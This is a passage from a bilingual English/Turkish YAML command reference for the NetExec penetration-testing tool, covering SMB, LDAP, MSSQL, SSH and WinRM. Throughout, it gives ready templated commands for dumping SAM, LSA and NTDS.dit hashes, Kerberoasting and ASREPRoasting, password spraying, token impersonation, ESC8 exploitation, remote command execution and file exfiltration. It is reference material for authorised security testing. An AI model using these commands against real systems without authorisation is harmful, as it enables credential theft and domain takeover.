        Enumerate active SMB sessions. Shows who is connected to SMB shares.
        Useful for identifying active users.
      tr: |
        Etkin SMB oturumlarını listeler. SMB paylaşımlarına kimin bağlı olduğu görüntülenir. Etkin
        kullanıcıları belirlemede işe yarar.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --sessions"

  - title:
      en: nxc smb - enumerate disks
      tr: nxc smb - uzak diskleri listeleme
    desc:
      en: |
        Enumerate disk drives on remote system. Shows available disk volumes
        and their sizes. Useful for reconnaissance.
      tr: |
        Uzak sistemdeki disk sürücülerini listeler. Kullanılabilir disk birimleri boyutlarıyla
        görüntülenir. Keşif için işe yarar.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --disks"

  - title:
      en: nxc smb - check SMB signing
      tr: nxc smb - SMB imzalama durumunu denetleme
    desc:
      en: |
        Check if SMB signing is required. Shows signing status for each host.
        Unsigned SMB allows for relay attacks.
      tr: |
        SMB imzasının zorunlu olup olmadığını denetler. Her makinenin imza durumu görüntülenir.
        İmzasız SMB geçiş saldırılarına olanak tanır.
    command: "nxc smb {{target}} --gen-relay-list {{output_file|targets.txt}}"

  - title:
      en: nxc smb - scan for vulnerabilities
      tr: nxc smb - bilinen zafiyetleri tarama
    desc:
      en: |
        Scan SMB targets for known vulnerabilities. Checks for common SMB
        vulnerabilities and misconfigurations.
      tr: |
        SMB hedeflerini bilinen zafiyetlere karşı tarar. Yaygın SMB zafiyetleri ile yanlış
        yapılandırmalar denetlenir.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --vulns"

  - title:
      en: nxc smb - dump LSA secrets
      tr: nxc smb - LSA gizli verilerini dökme
    desc:
      en: |
        Dump LSA secrets from remote system. Extracts cached credentials, service
        account passwords, etc. Requires admin privileges.
      tr: |
        Uzak sistemden LSA gizli verilerini döker. Önbelleğe alınmış bilgiler, hizmet hesabı
        parolaları gibi veriler çıkarılır. Yönetici yetkisi gerekir.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M lsassy"

  - title:
      en: nxc smb - dump SAM database
      tr: nxc smb - SAM veritabanını dökme
    desc:
      en: |
        Dump SAM database from remote system. Extracts local account password
        hashes. Requires SYSTEM privileges.
      tr: |
        Uzak sistemden SAM veritabanını döker. Yerel hesap parola karmaları çıkarılır. SYSTEM
        yetkisi gerekir.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M sam"

  - title:
      en: nxc smb - dump DPAPI secrets
      tr: nxc smb - DPAPI gizli verilerini dökme
    desc:
      en: |
        Dump DPAPI secrets from remote system. Extracts encrypted credentials
        stored by Windows applications. Requires user context.
      tr: |
        Uzak sistemden DPAPI gizli verilerini döker. Windows uygulamalarının sakladığı şifreli
        bilgiler çıkarılır. Kullanıcı bağlamı gerekir.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M dpapi"

  - title:
      en: nxc smb - dump NTDS.dit
      tr: nxc smb - NTDS.dit dosyasını dökme
    desc:
      en: |
        Dump NTDS.dit from domain controller. Extracts all domain account hashes.
        Requires Domain Admin privileges and access to DC.
      tr: |
        Etki alanı denetleyicisinden NTDS.dit dosyasını döker. Bütün etki alanı hesap karmaları
        çıkarılır. Etki alanı yöneticisi yetkisi ile denetleyici erişimi gerekir.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M ntds"

  - title:
      en: nxc smb - check for null sessions
      tr: nxc smb - boş oturum erişimini denetleme
    desc:
      en: |
        Check for null session access. Tests if anonymous/null sessions are
        allowed. Useful for enumeration without credentials.
      tr: |
        Boş oturum erişimini denetler. Anonim/boş oturumlara izin verilip verilmediği sınanır.
        Bilgisiz keşif için işe yarar.
    command: "nxc smb {{target}} -u '' -p ''"

  - title:
      en: nxc smb - generate hosts file
      tr: nxc smb - hosts dosyası oluşturma
    desc:
      en: |
        Generate hosts file from discovered systems. Creates /etc/hosts format
        file with hostname to IP mappings.
      tr: |
        Keşfedilen sistemlerden hosts dosyası üretir. Makine adı ile IP eşleşmelerini /etc/hosts
        biçiminde dosyaya yazar.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --gen-hosts-file {{output_file|hosts.txt}}"

  - title:
      en: nxc smb - generate krb5.conf
      tr: nxc smb - krb5.conf dosyası oluşturma
    desc:
      en: |
        Generate krb5.conf file for Kerberos. Creates Kerberos configuration
        file with domain information.
      tr: |
        Kerberos için krb5.conf dosyası üretir. Etki alanı bilgilerini içeren Kerberos yapılandırma
        dosyası oluşturulur.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --gen-krb5-conf {{output_file|krb5.conf}}"

  - title:
      en: nxc smb - generate TGT
      tr: nxc smb - Kerberos TGT bileti üretme
    desc:
      en: |
        Generate Kerberos TGT ticket. Requests TGT from KDC and saves to ccache
        file. Requires valid domain credentials.
      tr: |
        Kerberos TGT bileti üretir. KDC sunucusundan bilet istenir, ccache dosyasına kaydedilir.
        Geçerli etki alanı bilgisi gerekir.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --gen-tgt {{output_file|ticket.ccache}}"

  - title:
      en: nxc smb - change user password
      tr: nxc smb - kullanıcı parolasını değiştirme
    desc:
      en: |
        Change user password on remote system. Requires appropriate privileges
        to change the target user's password.
      tr: |
        Uzak sistemde kullanıcı parolasını değiştirir. Hedef kullanıcının parolasını değiştirecek
        yetki gerekir.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --change-password {{target_user}} {{new_password}}"

  - title:
      en: nxc smb - impersonate logged on users
      tr: nxc smb - oturum açmış kullanıcıların yerine geçme
    desc:
      en: |
        Impersonate users currently logged on. Steals tokens from logged on
        users for privilege escalation.
      tr: |
        Oturum açmış kullanıcıların yerine geçer. Yetki yükseltmek için oturum açmış kullanıcılardan
        jeton çalınır.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M impersonate"

  - title:
      en: nxc smb - check for Print Spooler
      tr: nxc smb - Print Spooler hizmetini denetleme
    desc:
      en: |
        Check if Print Spooler service is running. Print Spooler can be abused
        for privilege escalation (CVE-2021-1675).
      tr: |
        Print Spooler hizmetinin çalışıp çalışmadığını denetler. Print Spooler yetki yükseltmede
        kötüye kullanılabilir (CVE-2021-1675).
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M spooler"

  - title:
      en: nxc smb - check for WebDAV
      tr: nxc smb - WebDAV erişimini denetleme
    desc:
      en: |
        Check if WebDAV is running and accessible. WebDAV can be used for file
        operations and potential exploitation.
      tr: |
        WebDAV çalışıp erişilebilir durumda mı denetler. WebDAV dosya işlemleri ile olası sömürü
        için kullanılabilir.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M webdav"

  - title:
      en: nxc smb - defeat LAPS
      tr: nxc smb - LAPS parolalarını alma
    desc:
      en: |
        Extract LAPS (Local Administrator Password Solution) passwords. Retrieves
        managed local admin passwords from domain.
      tr: |
        LAPS (Yerel Yönetici Parola Çözümü) parolalarını alır. Etki alanından yönetilen yerel yönetici
        parolaları çekilir.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M laps"

  # ============================================================================
  # LDAP PROTOCOL
  # ============================================================================

  - title:
      en: nxc ldap - basic authentication
      tr: nxc ldap - temel kimlik doğrulama
    desc:
      en: |
        Authenticate to LDAP with username and password. Tests LDAP credentials.
        Shows domain information on success.
      tr: |
        Kullanıcı adı ile parolayla LDAP kimlik doğrulaması yapar. LDAP bilgisi sınanır. Başarıda
        etki alanı bilgisi görüntülenir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}}"

  - title:
      en: nxc ldap - authenticate with hash
      tr: nxc ldap - karmayla kimlik doğrulama
    desc:
      en: |
        Authenticate to LDAP using NTLM hash. Pass-the-hash authentication for
        LDAP protocol.
      tr: |
        NTLM karmasıyla LDAP kimlik doğrulaması yapar. LDAP protokolünde hash ile geçiş yapılır.
    command: "nxc ldap {{target}} -u {{username}} -H {{hash|A29F7623FD11550DEF0192DE9246F46B}}"

  - title:
      en: nxc ldap - authenticate without SMB
      tr: nxc ldap - SMB bağlantısı olmadan kimlik doğrulama
    desc:
      en: |
        Authenticate to LDAP without initial SMB connection. Use --no-smb when
        SMB port is closed or you want to skip SMB connection.
      tr: |
        Önce SMB bağlantısı kurmadan LDAP kimlik doğrulaması yapar. SMB bağlantı noktası kapalıyken
        ya da SMB bağlantısı atlanmak istenirken --no-smb kullanılır.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --no-smb"

  - title:
      en: nxc ldap - enumerate users
      tr: nxc ldap - etki alanındaki kullanıcıları listeleme
    desc:
      en: |
        Enumerate all users in domain via LDAP. Lists all domain users with
        their attributes. Requires domain credentials.
      tr: |
        LDAP üzerinden etki alanındaki bütün kullanıcıları listeler. Bütün etki alanı kullanıcıları
        öznitelikleriyle görüntülenir. Etki alanı bilgisi gerekir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --users"

  - title:
      en: nxc ldap - enumerate active users
      tr: nxc ldap - yalnızca etkin kullanıcıları listeleme
    desc:
      en: |
        Enumerate only active (enabled) users in domain. Filters out disabled
        accounts. More efficient than full user enumeration.
      tr: |
        Etki alanında yalnız etkin (devre dışı olmayan) kullanıcıları listeler. Kapatılmış hesaplar
        elenir. Bütün kullanıcıları listelemekten daha verimlidir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --active-users"

  - title:
      en: nxc ldap - export users to file
      tr: nxc ldap - kullanıcı listesini dosyaya aktarma
    desc:
      en: |
        Enumerate users and export to file. Saves user list to specified file
        for further processing or analysis.
      tr: |
        Kullanıcıları listeleyip dosyaya aktarır. Kullanıcı listesi belirtilen dosyaya kaydedilir,
        sonraki işlem ya da inceleme için kullanılır.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --users-export {{output_file|users.txt}}"

  - title:
      en: nxc ldap - enumerate group members
      tr: nxc ldap - grup üyelerini listeleme
    desc:
      en: |
        Enumerate members of specific group. Lists all users in specified domain
        group. Useful for finding privileged group members.
      tr: |
        Belirli grubun üyelerini listeler. Belirtilen etki alanı grubundaki bütün kullanıcılar
        görüntülenir. Ayrıcalıklı grup üyelerini bulmada işe yarar.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --group-members {{group_name|Domain Admins}}"

  - title:
      en: nxc ldap - enumerate trusts
      tr: nxc ldap - etki alanı güven ilişkilerini listeleme
    desc:
      en: |
        Enumerate domain trusts. Lists all trust relationships with other domains.
        Useful for cross-domain attack planning.
      tr: |
        Etki alanı güven ilişkilerini listeler. Başka etki alanlarıyla bütün güven bağlantıları
        görüntülenir. Etki alanları arası saldırı planlamasında işe yarar.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --trusts"

  - title:
      en: nxc ldap - enumerate domain controllers
      tr: nxc ldap - etki alanı denetleyicilerini listeleme
    desc:
      en: |
        Enumerate domain controllers. Lists all DCs in the domain with their
        IP addresses and hostnames.
      tr: |
        Etki alanı denetleyicilerini listeler. Etki alanındaki bütün denetleyiciler IP adresleri ile
        makine adlarıyla görüntülenir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --dc-list"

  - title:
      en: nxc ldap - find domain SID
      tr: nxc ldap - etki alanı SID değerini bulma
    desc:
      en: |
        Find domain SID (Security Identifier). Retrieves domain SID which is
        needed for various attacks and enumeration.
      tr: |
        Etki alanı SID (Güvenlik Tanımlayıcı) değerini bulur. Alınan SID değeri çeşitli saldırılar
        ile keşif için gereklidir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --domain-sid"

  - title:
      en: nxc ldap - ASREPRoast attack
      tr: nxc ldap - ASREPRoast saldırısı
    desc:
      en: |
        Perform ASREPRoast attack. Retrieves AS-REP hashes for users without
        Kerberos pre-authentication. Can be done without credentials.
      tr: |
        ASREPRoast saldırısı yapar. Kerberos ön kimlik doğrulaması kapalı kullanıcılardan AS-REP
        karmaları alınır. Bilgisiz yapılabilir.
    command: "nxc ldap {{target}} -u {{username|''}} -p {{password|''}} --asreproast {{output_file|asrep.txt}}"

  - title:
      en: nxc ldap - ASREPRoast with user list
      tr: nxc ldap - kullanıcı listesiyle ASREPRoast saldırısı
    desc:
      en: |
        ASREPRoast attack with user list. Tests multiple users for AS-REP
        roastable accounts. No authentication required.
      tr: |
        Kullanıcı listesiyle ASREPRoast saldırısı yapar. Birden çok kullanıcı AS-REP ile kırılabilirlik
        yönünden sınanır. Kimlik doğrulaması gerekmez.
    command: "nxc ldap {{target}} -u {{users_file|~/users.txt}} -p '' --asreproast {{output_file|asrep.txt}}"

  - title:
      en: nxc ldap - ASREPRoast with authentication
      tr: nxc ldap - kimlik bilgileriyle ASREPRoast saldırısı
    desc:
      en: |
        ASREPRoast attack with valid credentials. Enumerates all users and finds
        AS-REP roastable accounts. More comprehensive than unauthenticated version.
      tr: |
        Geçerli bilgiyle ASREPRoast saldırısı yapar. Bütün kullanıcılar listelenir, AS-REP ile
        kırılabilen hesaplar bulunur. Bilgisiz sürümden daha kapsamlıdır.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --asreproast {{output_file|asrep.txt}}"

  - title:
      en: nxc ldap - Kerberoasting attack
      tr: nxc ldap - Kerberoasting saldırısı
    desc:
      en: |
        Perform Kerberoasting attack. Retrieves TGS-REP hashes for service accounts.
        Requires domain account or AS-REP roastable account.
      tr: |
        Kerberoasting saldırısı yapar. Hizmet hesaplarından TGS-REP karmaları alınır. Etki alanı hesabı
        ya da AS-REP ile kırılabilen hesap gerekir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --kerberoasting {{output_file|kerberoast.txt}}"

  - title:
      en: nxc ldap - Kerberoasting via AS-REP
      tr: nxc ldap - ön kimlik doğrulamasız Kerberoasting saldırısı
    desc:
      en: |
        Kerberoasting using AS-REP roastable account. Combines --no-preauth-targets
        and --kerberoasting to perform Kerberoasting without pre-authentication.
      tr: |
        Ön kimlik doğrulamasız hesapla Kerberoasting yapar. --no-preauth-targets ile --kerberoasting
        birlikte ön kimlik doğrulamasız Kerberoasting için kullanılır.
    command: "nxc ldap {{target}} -u {{asrep_user}} -p '' --no-preauth-targets {{targets_file|kerberoastable.list}} --kerberoasting {{output_file|kerberoast.txt}}"

  - title:
      en: nxc ldap - check LDAP signing
      tr: nxc ldap - LDAP imzalama durumunu denetleme
    desc:
      en: |
        Check if LDAP signing is required. Unsigned LDAP allows for relay attacks.
        Shows signing status for domain controllers.
      tr: |
        LDAP imzasının zorunlu olup olmadığını denetler. İmzasız LDAP geçiş saldırılarına olanak
        tanır. Etki alanı denetleyicilerinin imza durumu görüntülenir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --ldap-signing"

  - title:
      en: nxc ldap - find unconstrained delegation
      tr: nxc ldap - sınırsız yetki devrini bulma
    desc:
      en: |
        Find accounts with unconstrained delegation. These accounts can be abused
        for privilege escalation and credential theft.
      tr: |
        Sınırsız yetki devri tanımlı hesapları bulur. Bu hesaplar yetki yükseltme ile bilgi hırsızlığında
        kötüye kullanılabilir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --unconstrained-delegation"

  - title:
      en: nxc ldap - find misconfigured delegation
      tr: nxc ldap - hatalı kısıtlı yetki devrini bulma
    desc:
      en: |
        Find accounts with misconfigured constrained delegation. Constrained
        delegation misconfigurations can be exploited for privilege escalation.
      tr: |
        Hatalı yapılandırılmış kısıtlı yetki devri tanımlı hesapları bulur. Kısıtlı yetki devri
        yanlışları yetki yükseltmede sömürülebilir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --find-delegation"

  - title:
      en: nxc ldap - enumerate admin count
      tr: nxc ldap - adminCount değerli kullanıcıları listeleme
    desc:
      en: |
        Enumerate users with adminCount=1. These users have privileged access
        and are high-value targets.
      tr: |
        adminCount=1 değerli kullanıcıları listeler. Bu kullanıcılar ayrıcalıklı erişime sahiptir,
        yüksek değerli hedeftir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --admin-count"

  - title:
      en: nxc ldap - dump GMSA accounts
      tr: nxc ldap - GMSA hesaplarını dökme
    desc:
      en: |
        Dump Group Managed Service Account (GMSA) information. GMSA accounts
        have managed passwords that can be extracted.
      tr: |
        Grup Yönetimli Hizmet Hesabı (GMSA) bilgilerini döker. GMSA hesaplarında yönetilen parolalar
        çıkarılabilir durumdadır.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --gmsa"

  - title:
      en: nxc ldap - extract GMSA secrets
      tr: nxc ldap - GMSA gizli verilerini alma
    desc:
      en: |
        Extract GMSA account secrets. Retrieves password hashes for GMSA accounts
        that can be used for authentication.
      tr: |
        GMSA hesabı gizli verilerini alır. GMSA hesaplarının kimlik doğrulamada kullanılabilecek parola
        karmaları çekilir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --gmsa-secrets"

  - title:
      en: nxc ldap - enumerate machine account quota
      tr: nxc ldap - makine hesabı kotasını sorgulama
    desc:
      en: |
        Check machine account quota. Shows how many computer accounts a user can
        create. Useful for domain persistence.
      tr: |
        Makine hesabı kotasını sorgular. Kullanıcının oluşturabileceği bilgisayar hesabı sayısı
        görüntülenir. Etki alanında kalıcılık için işe yarar.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --maq"

  - title:
      en: nxc ldap - read DACL rights
      tr: nxc ldap - DACL izinlerini okuma
    desc:
      en: |
        Read DACL (Discretionary Access Control List) rights. Shows permissions
        on objects that might allow privilege escalation.
      tr: |
        DACL (İsteğe Bağlı Erişim Denetim Listesi) izinlerini okur. Yetki yükseltmeye olanak
        tanıyabilecek nesne izinleri görüntülenir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --dacl"

  - title:
      en: nxc ldap - get user descriptions
      tr: nxc ldap - kullanıcı açıklama alanlarını alma
    desc:
      en: |
        Get user descriptions from LDAP. User descriptions sometimes contain
        passwords or other sensitive information.
      tr: |
        LDAP üzerinden kullanıcı açıklama alanlarını alır. Açıklama alanları bazen parola ya da
        başka duyarlı bilgi içerir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --user-descriptions"

  - title:
      en: nxc ldap - extract subnet information
      tr: nxc ldap - alt ağ bilgilerini alma
    desc:
      en: |
        Extract subnet information from AD. Lists all subnets defined in
        Active Directory Sites and Services.
      tr: |
        AD üzerinden alt ağ bilgilerini alır. Active Directory Siteler ile Hizmetlerde tanımlı
        bütün alt ağlar listelenir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --subnets"

  - title:
      en: nxc ldap - enumerate SCCM
      tr: nxc ldap - SCCM bilgilerini listeleme
    desc:
      en: |
        Enumerate SCCM (System Center Configuration Manager) information.
        SCCM can be abused for lateral movement and code execution.
      tr: |
        SCCM (System Center Configuration Manager) bilgilerini listeler. SCCM yatay yayılım ile
        kod çalıştırma için kötüye kullanılabilir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --sccm"

  - title:
      en: nxc ldap - enumerate Entra ID
      tr: nxc ldap - Entra ID bilgilerini listeleme
    desc:
      en: |
        Enumerate Entra ID (Azure AD) information. Shows Entra ID configuration
        and hybrid setup information.
      tr: |
        Entra ID (Azure AD) bilgilerini listeler. Entra ID yapılandırması ile karma kurulum bilgisi
        görüntülenir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --entra-id"

  - title:
      en: nxc ldap - query LDAP
      tr: nxc ldap - özel LDAP sorgusu çalıştırma
    desc:
      en: |
        Execute custom LDAP query. Allows running arbitrary LDAP queries for
        advanced enumeration and data extraction.
      tr: |
        Özel LDAP sorgusu çalıştırır. Gelişmiş keşif ile veri çıkarma için istenen LDAP sorguları
        koşulur.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --query {{ldap_query|(objectClass=user)}}"

  - title:
      en: nxc ldap - BloodHound ingestor
      tr: nxc ldap - BloodHound veri toplayıcısı
    desc:
      en: |
        Run BloodHound ingestor to collect AD data. Generates BloodHound-compatible
        data files for graph analysis.
      tr: |
        BloodHound veri toplayıcısını çalıştırarak AD verisini toplar. Grafik incelemesi için
        BloodHound uyumlu veri dosyaları üretilir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --bloodhound"

  - title:
      en: nxc ldap - exploit ESC8 (ADCS)
      tr: nxc ldap - ESC8 zafiyetinden yararlanma
    desc:
      en: |
        Exploit ESC8 vulnerability in Active Directory Certificate Services.
        Allows for domain escalation through certificate abuse.
      tr: |
        Active Directory Sertifika Hizmetleri üzerindeki ESC8 zafiyetinden yararlanır. Sertifika
        kötüye kullanımıyla etki alanında yükselmeye olanak tanır.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --esc8"

  - title:
      en: nxc ldap - raise child domain
      tr: nxc ldap - alt etki alanının işlev düzeyini yükseltme
    desc:
      en: |
        Raise functional level of child domain. Advanced domain manipulation
        requiring Domain Admin privileges.
      tr: |
        Alt etki alanının işlev düzeyini yükseltir. Etki alanı yöneticisi yetkisi gerektiren gelişmiş
        etki alanı işlemidir.
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --raise-child"

  # ============================================================================
  # MSSQL PROTOCOL
  # ============================================================================

  - title:
      en: nxc mssql - authenticate Windows auth
      tr: nxc mssql - Windows kimlik doğrulaması
    desc:
      en: |
        Authenticate to MSSQL using Windows authentication. Default authentication
        method. Uses current user's Windows credentials or specified domain account.
      tr: |
        Windows kimlik doğrulamasıyla MSSQL kimlik doğrulaması yapar. Varsayılan yöntemdir. O anki
        Windows bilgisi ya da belirtilen etki alanı hesabı kullanılır.
    command: "nxc mssql {{target}} -u {{username}} -p {{password}}"

  - title:
      en: nxc mssql - authenticate Windows auth with domain
      tr: nxc mssql - etki alanı belirterek Windows kimlik doğrulaması
    desc:
      en: |
        Authenticate to MSSQL with Windows auth when SMB port is closed. Specify
        domain explicitly with -d flag to avoid SMB connection.
      tr: |
        SMB bağlantı noktası kapalıyken etki alanını açıkça belirterek Windows kimlik doğrulaması
        yapar. SMB bağlantısından kaçınmak için -d bayrağıyla etki alanı verilir.
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} -d {{domain|DOMAIN}}"

  - title:
      en: nxc mssql - authenticate local auth
      tr: nxc mssql - yerel SQL kimlik doğrulaması
    desc:
      en: |
        Authenticate to MSSQL using SQL Server authentication (local auth).
        Use --local-auth flag for SQL login instead of Windows login.
      tr: |
        Yerel SQL kimlik doğrulamasıyla MSSQL kimlik doğrulaması yapar. Windows girişi yerine SQL
        girişi için --local-auth bayrağı kullanılır.
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --local-auth"

  - title:
      en: nxc mssql - specify custom port
      tr: nxc mssql - özel bağlantı noktasını belirtme
    desc:
      en: |
        Connect to MSSQL on custom port. Default is 1433. Use --port for
        non-standard ports.
      tr: |
        MSSQL sunucusuna özel bağlantı noktasından bağlanır. Varsayılan 1433. Standart dışı bağlantı
        noktaları için --port kullanılır.
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --port {{port|1434}}"

  - title:
      en: nxc mssql - execute SQL query
      tr: nxc mssql - SQL sorgusu çalıştırma
    desc:
      en: |
        Execute SQL query on MSSQL server. Runs specified SQL command and
        displays results. Requires appropriate database permissions.
      tr: |
        MSSQL sunucusunda SQL sorgusu çalıştırır. Belirtilen SQL komutu koşulur, sonuçlar
        görüntülenir. Uygun veritabanı izni gerekir.
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} -q '{{sql_query|SELECT name FROM master.dbo.sysdatabases;}}'"

  - title:
      en: nxc mssql - execute Windows command
      tr: nxc mssql - Windows komutu çalıştırma
    desc:
      en: |
        Execute Windows command via MSSQL xp_cmdshell. Requires xp_cmdshell to be
        enabled and appropriate privileges. Shows (Pwn3d!) on success.
      tr: |
        MSSQL xp_cmdshell üzerinden Windows komutu çalıştırır. xp_cmdshell etkinliği ile uygun
        yetki gerekir. Başarıda (Pwn3d!) görüntülenir.
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"

  - title:
      en: nxc mssql - password spray
      tr: nxc mssql - parola püskürtme
    desc:
      en: |
        Password spray against MSSQL servers. Tests credentials against multiple
        MSSQL instances. Use --no-bruteforce for 1:1 user:password mapping.
      tr: |
        MSSQL sunucularına parola püskürtme yapar. Bilgiler birden çok MSSQL örneğinde sınanır.
        Birebir kullanıcı:parola eşleşmesi için --no-bruteforce kullanılır.
    command: "nxc mssql {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  - title:
      en: nxc mssql - enumerate users by RID
      tr: nxc mssql - RID üzerinden kullanıcı listeleme
    desc:
      en: |
        Enumerate users by brute forcing RIDs. Attempts to resolve SIDs to usernames
        by trying different RID values. Useful for user enumeration.
      tr: |
        RID değerlerini tek tek deneyerek kullanıcı listeler. Farklı RID değerleriyle SID adresleri
        kullanıcı adlarına çözümlenmeye çalışılır. Kullanıcı keşfinde işe yarar.
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --rid-brute"

  - title:
      en: nxc mssql - privilege escalation
      tr: nxc mssql - yetki yükseltme denemesi
    desc:
      en: |
        Attempt MSSQL privilege escalation. Tries to escalate privileges through
        various MSSQL misconfigurations and vulnerabilities.
      tr: |
        MSSQL yetki yükseltme dener. Çeşitli MSSQL yanlış yapılandırmaları ile zafiyetler üzerinden
        yetki yükseltmeye çalışılır.
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --privesc"

  - title:
      en: nxc mssql - upload file
      tr: nxc mssql - dosyayı sunucuya yükleme
    desc:
      en: |
        Upload file to MSSQL server. Transfers local file to remote system via
        MSSQL. Useful for transferring tools or payloads.
      tr: |
        MSSQL üzerinden uzak sisteme dosya yükler. Yerel dosya MSSQL aracılığıyla uzak sisteme
        aktarılır. Araç ya da yük aktarmada işe yarar.
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --put-file {{local_file|/tmp/file.txt}} {{remote_path|C:\\temp\\file.txt}}"

  - title:
      en: nxc mssql - download file
      tr: nxc mssql - sunucudan dosya indirme
    desc:
      en: |
        Download file from MSSQL server. Retrieves remote file via MSSQL to
        local system. Useful for data exfiltration.
      tr: |
        MSSQL üzerinden uzak sistemden dosya indirir. Uzak dosya MSSQL aracılığıyla yerel sisteme
        alınır. Veri çıkarmada işe yarar.
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|C:\\temp\\file.txt}} {{local_file|/tmp/file.txt}}"

  # ============================================================================
  # SSH PROTOCOL
  # ============================================================================

  - title:
      en: nxc ssh - basic authentication
      tr: nxc ssh - temel kimlik doğrulama
    desc:
      en: |
        Authenticate to SSH server with username and password. Tests SSH credentials.
        Shows SSH version and authentication result.
      tr: |
        Kullanıcı adı ile parolayla SSH kimlik doğrulaması yapar. SSH bilgisi sınanır. SSH sürümü
        ile kimlik doğrulama sonucu görüntülenir.
    command: "nxc ssh {{target}} -u {{username}} -p {{password}}"

  - title:
      en: nxc ssh - specify custom port
      tr: nxc ssh - özel bağlantı noktasını belirtme
    desc:
      en: |
        Connect to SSH on custom port. Default is 22. Use --port for non-standard
        SSH ports.
      tr: |
        SSH sunucusuna özel bağlantı noktasından bağlanır. Varsayılan 22. Standart dışı SSH bağlantı
        noktaları için --port kullanılır.
    command: "nxc ssh {{target}} --port {{port|2222}}"

  - title:
      en: nxc ssh - execute command
      tr: nxc ssh - uzaktan komut çalıştırma
    desc:
      en: |
        Execute command on remote system via SSH. Runs command and displays output.
        Shows (Pwn3d!) when root access is obtained.
      tr: |
        SSH üzerinden uzak sistemde komut çalıştırır. Komut koşulur, çıktısı görüntülenir. Kök
        erişiminde (Pwn3d!) görüntülenir.
    command: "nxc ssh {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"

  - title:
      en: nxc ssh - password spray
      tr: nxc ssh - parola püskürtme
    desc:
      en: |
        Password spray against SSH servers. Tests credentials against multiple
        SSH hosts. Watch for account lockouts!
      tr: |
        SSH sunucularına parola püskürtme yapar. Bilgiler birden çok SSH makinesinde sınanır. Hesap
        kilitlenmelerine dikkat edilir!
    command: "nxc ssh {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  - title:
      en: nxc ssh - get file from remote
      tr: nxc ssh - uzaktan dosya indirme
    desc:
      en: |
        Download file from remote system via SCP. Transfers file from remote
        to local system using SSH/SCP.
      tr: |
        SCP ile uzak sistemden dosya indirir. SSH/SCP kullanılarak uzak dosya yerel sisteme aktarılır.
    command: "nxc ssh {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|/tmp/file.txt}} {{local_path|/tmp/file.txt}}"

  - title:
      en: nxc ssh - put file to remote
      tr: nxc ssh - uzak makineye dosya yükleme
    desc:
      en: |
        Upload file to remote system via SCP. Transfers local file to remote
        system using SSH/SCP.
      tr: |
        SCP ile uzak sisteme dosya yükler. SSH/SCP kullanılarak yerel dosya uzak sisteme aktarılır.
    command: "nxc ssh {{target}} -u {{username}} -p {{password}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|/tmp/file.txt}}"

  # ============================================================================
  # WinRM PROTOCOL
  # ============================================================================

  - title:
      en: nxc winrm - basic authentication
      tr: nxc winrm - temel kimlik doğrulama
    desc:
      en: |
        Authenticate to WinRM service with username and password. Tests WinRM
        credentials. Shows (Pwn3d!) when code execution is possible.
      tr: |
        Kullanıcı adı ile parolayla WinRM kimlik doğrulaması yapar. WinRM bilgisi sınanır. Kod
        çalıştırma mümkün olduğunda (Pwn3d!) görüntülenir.
    command: "nxc winrm {{target}} -u {{username}} -p {{password}}"

  - title:
      en: nxc winrm - authenticate with domain
      tr: nxc winrm - etki alanı belirterek kimlik doğrulama
    desc:
      en: |
        Authenticate to WinRM with domain when SMB port is closed. Use -d flag
        to specify domain and avoid SMB connection.
      tr: |
        SMB bağlantı noktası kapalıyken etki alanı belirterek WinRM kimlik doğrulaması yapar. SMB
        bağlantısından kaçınmak için -d bayrağıyla etki alanı belirtilir.
